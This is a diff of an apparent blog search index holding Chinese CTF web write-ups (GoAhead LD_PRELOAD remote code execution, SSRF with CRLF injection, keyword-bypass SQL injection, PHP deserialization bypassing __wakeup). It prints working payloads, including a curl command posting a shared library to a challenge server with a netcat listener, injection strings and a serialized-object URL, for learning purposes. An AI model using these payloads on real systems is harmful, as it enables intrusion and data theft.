@@ -32,7 +32,7 @@
   </entry>
   <entry>
     <title>2019红帽杯复现</title>
-    <url>/2019/11/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
+    <url>/2019/11/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       <categories>
         <category>CTF</category>
@@ -44,8 +44,8 @@
   </entry>
   <entry>
     <title>湖湘杯2019复现</title>
-    <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>
+    <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>
 
 
 
@@ -61,17 +61,17 @@
 <p>编译动态库(注意和服务器环境相似)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/2019湖湘杯复现/image-20191109223215495.png" alt="image-20191109223215495"></p>
+<p><img src="/2019/11/2019湖湘杯web复现/image-20191109223215495.png" alt="image-20191109223215495"></p>
 <p>会报错，但不影响使用</p>
 <p>服务器先监听1234端口</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/2019湖湘杯复现/image-20191109222241231.png" alt="image-20191109222241231"></p>
+<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222241231.png" alt="image-20191109222241231"></p>
 <p>然后执行payload</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>
 
 <p>服务错误就多运行几次</p>
-<p><img src="/2019/11/2019湖湘杯复现/image-20191109222659969.png" alt="image-20191109222659969"></p>
+<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222659969.png" alt="image-20191109222659969"></p>
 <p>得到flag</p>
 ]]></content>
       <categories>
@@ -468,7 +468,63 @@
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101124245849.png" alt="image-20191101124245849"></p>
 <p>1.txt要有可写权限</p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101124431268.png" alt="image-20191101124431268"></p>
-<h2 id="服务端检测系统：emm，自己看"><a href="#服务端检测系统：emm，自己看" class="headerlink" title="服务端检测系统：emm，自己看"></a>服务端检测系统：emm，自己看</h2><h2 id="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"><a href="#Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！" class="headerlink" title="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"></a>Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！</h2><p>熟悉的界面</p>
+<h2 id="服务端检测系统：emm，自己看"><a href="#服务端检测系统：emm，自己看" class="headerlink" title="服务端检测系统：emm，自己看"></a>服务端检测系统：emm，自己看</h2><p>SSRF还没有写过题目，利用复现学习一下</p>
+<p>首先有个admin.php</p>
+<p>但要求127.0.0.1才能访问</p>
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211164956360.png" alt="image-20191211164956360"></p>
+<p>有index.php的源码，</p>
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211164910208.png" alt="image-20191211164910208"></p>
+<p>这里利用index.php SSRF访问admin.php</p>
+<p>但要绕过“/anything”</p>
+<p>这里可以构造url=<a href="http://127.0.0.1/admin.php?&amp;method=GET" target="_blank" rel="noopener">http://127.0.0.1/admin.php?&amp;method=GET</a></p>
+<p>这样“/anything” 就成了一个参数</p>
+<p>显示failed是因为采用GET请求方式，服务端是不会返回Allow头的，而且这里的SSRF没有回显，只有一个显示响应体长度的语句</p>
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211195729531.png" alt="image-20191211195729531"></p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sprintf</span>(<span class="string">"body length of $method%d"</span>, $body);</span><br></pre></td></tr></table></figure>
+
+<p>这句 $method可控，所以传入%s% 覆盖后 %s%%d 双百分号返回一个%,但这时 %d 已经是一个字符串</p>
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191211202422540.png" alt="image-20191211202422540"></p>
+<p>得到admin.php的源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">"iwantflag"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can visit it"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关于HTTP头</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">http头的格式：</span><br><span class="line"></span><br><span class="line">请求方法 /路径 HTTP/版本</span><br><span class="line">头字段: 值</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">trueGET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">trueHost: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+
+<p>http头部的各个字段之间用CRLF(\r\n)(%0d%0a)分割<br>http请求头(响应头)和请求体(响应体)之间用两个CRLF分割</p>
+<p>关于Http请求</p>
+<p>get请求:</p>
+<pre><code>GET / HTTP/1.1
+Host: 127.0.0.1</code></pre><p>post请求</p>
+<pre><code>POST / HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-from-urlencoded
+Content-Length: 3
+
+x=1</code></pre><p>http头的字段（常见）<br>        Host</p>
+<pre><code>用于多个域名映射到同一个ip时，按照Host的内容匹配不同网站内容，每个Http头必须有Host头
+当这个目的主机上只有一个网站，那么Host字段内容可以为任意值</code></pre><p>Content-Type</p>
+<p>表明内容部分的编码格式和媒体类型 post/put等方式必须有(如果有请求体)</p>
+<p>请求头中的Content-Type<br>GET请求:<br>GET没有请求实体部分，所以请求头中不需要设置Content-Type字段<br>POST/PUT请求<br>如果post/put请求有请求体(有传值)，那么必须要设置Content-Type字段(否则服务端可能无法处理你的请求)</p>
+<pre><code>第一类：raw原始类型，可以上传任意格式的文本，比如text、json、xml、html…(中文不进行编码)
+text请求：Content-Type: text/plain
+json请求：Content-Type: application/json
+html请求：Content-Type: text/html
+第二类：application/x-www-from-urlencoded，会将表单内的数据转换拼接成key-value对(对非ascii码进行编码)
+Content-Type: application/x-www-from-urlencoded
+第三类：multipart/from-data，将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。
+Content-Type: multipart/from-data;boundary=xxx
+在请求体中会有一个Content-Disposition字段，用于描述提交的表单的具体信息</code></pre><p>响应头中的Content-Type：<br> 用来告诉客户端，服务端返回的真实内容类型是什么。浏览器或客户端会根据这个值来做一些操作。</p>
+<p> Content-Length 表示内容部分的长度 post/put等方式必须有(如果有请求体)</p>
+<p>在源码中使用的是stream_context_create()函数发起HTTP请求</p>
+<p>这里如http协议头等一些信息，作为一个数组传入。所以我们能利用CRLF构造一个新的POST包</p>
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191212220127675.png" alt="image-20191212220127675"></p>
+<p>这里我们把url改成自己服务器的ip，看看经过处理后的POST是什么样子。</p>
+<p>这个POST包最后也加上了一些字符串，所以为了防止iwantflag参数被污染，所以我们传入第二个参数b</p>
+<p>而且为了从index.php得到回显，我们依旧要覆盖 %d 所以b=%s% </p>
+<p>还有一点，&amp;在URL中是具有分割参数的作用，所以要进行URL编码</p>
+<p>最后的payload如下</p>
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191212074711793.png" alt="image-20191212074711793"></p>
+<h2 id="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"><a href="#Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！" class="headerlink" title="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"></a>Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！</h2><p>熟悉的界面</p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191101125127520.png" alt="image-20191101125127520"></p>
 <p>同样的手法</p>
 <figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">‘</span>=<span class="string">’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">‘=’</span></span><br></pre></td></tr></table></figure>
@@ -519,6 +575,7 @@
 <p>利用PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">伪协议</a>和base64加密读取文件内容</p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191031124114147.png" alt="image-20191031124114147"></p>
 <p>base64解码得到flag</p>
+<h2 id="李三的代码审计笔记第二页"><a href="#李三的代码审计笔记第二页" class="headerlink" title="李三的代码审计笔记第二页"></a>李三的代码审计笔记第二页</h2><p>根据题目提示，下载源码</p>
 <h2 id="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"><a href="#Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！" class="headerlink" title="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"></a>Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！</h2><p>经过测试一些关键字被过滤了，但通过双写可以绕过</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //判断字段</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //查数据库</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //查表</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //查字段</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //获取数据</span><br></pre></td></tr></table></figure>
 
@@ -565,7 +622,7 @@
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029232338502.png" alt="image-20191029232338502"></p>
 <p>base64解码</p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191029232357758.png" alt="image-20191029232357758"></p>
-<h2 id="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ"><a href="#你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ=="></a>你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ==</h2><p>上传正常的图片</p>
+<h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><h2 id="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ"><a href="#你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ=="></a>你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ==</h2><p>上传正常的图片</p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191030232940824.png" alt="image-20191030232940824"></p>
 <p>Not image！</p>
 <p>尝试修改Content-Type</p>
@@ -612,6 +669,20 @@
 
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191103221650185.png" alt="image-20191103221650185"></p>
 <p><a href="https://www.freebuf.com/news/172507.html" target="_blank" rel="noopener">参考文章1</a></p>
+<h2 id="又来一只猫-我家猫名字叫php"><a href="#又来一只猫-我家猫名字叫php" class="headerlink" title="又来一只猫: 我家猫名字叫php"></a>又来一只猫: 我家猫名字叫php</h2><p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106232809806.png" alt="image-20191106232809806"></p>
+<p>推测应该存在备份文件，盲猜 <code>www.zip</code></p>
+<p>下载后解压，index.php中接受select参数并反序列化。</p>
+<p>查看class.php</p>
+<p>根据 <code>__destruct()</code>函数 反序列化要使$username=admin,$password=100.</p>
+<p>但有个问题要绕过 <code>__wakeup()</code> ,这里可以利用 CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong> </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106234145206.png" alt="image-20191106234145206"></p>
+<p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">参考文章1</a></p>
+<p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">参考文章2</a></p>
 <h2 id="你有初恋吗：你变心了吗"><a href="#你有初恋吗：你变心了吗" class="headerlink" title="你有初恋吗：你变心了吗"></a>你有初恋吗：你变心了吗</h2><p>打开题目<a href="http://cxc.design/53a5734d6c99f89a/" target="_blank" rel="noopener">链接</a></p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106163009923.png" alt="image-20191106163009923"></p>
 <p>F12查看源码</p>
@@ -632,22 +703,7 @@
 <p>思路太局限了。。。</p>
 <p><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">参考文章1</a></p>
 <p><a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">参考文章2</a></p>
-<h2 id="又来一只猫-我家猫名字叫php"><a href="#又来一只猫-我家猫名字叫php" class="headerlink" title="又来一只猫: 我家猫名字叫php"></a>又来一只猫: 我家猫名字叫php</h2><p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106232809806.png" alt="image-20191106232809806"></p>
-<p>推测应该存在备份文件，盲猜 <code>www.zip</code></p>
-<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106232905931.png" alt="image-20191106232905931"></p>
-<p>下载后解压，index.php中接受select参数并反序列化。</p>
-<p>查看class.php</p>
-<p>根据 <code>__destruct()</code>函数 反序列化要使$username=admin,$password=100.</p>
-<p>但有个问题要绕过 <code>__wakeup()</code> ,这里可以利用 CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong> </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>最终payload</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/10/第十届极客大挑战Write-up/image-20191106234145206.png" alt="image-20191106234145206"></p>
-<p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">参考文章1</a></p>
-<p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">参考文章2</a></p>
-<h2 id="你读懂潇文清的网站了吗-xxe"><a href="#你读懂潇文清的网站了吗-xxe" class="headerlink" title="你读懂潇文清的网站了吗 : xxe"></a>你读懂潇文清的网站了吗 : xxe</h2><p>都已经提示xxe了</p>
+<h2 id="Finalsql"><a href="#Finalsql" class="headerlink" title="Finalsql"></a>Finalsql</h2><h2 id="你读懂潇文清的网站了吗-xxe"><a href="#你读懂潇文清的网站了吗-xxe" class="headerlink" title="你读懂潇文清的网站了吗 : xxe"></a>你读懂潇文清的网站了吗 : xxe</h2><p>都已经提示xxe了</p>
 <p><img src="/2019/10/第十届极客大挑战Write-up/image-20191112171229906.png" alt="image-20191112171229906"></p>
 <p>利用php伪协议读取源码</p>
 <p>index.php中的代码：</p>
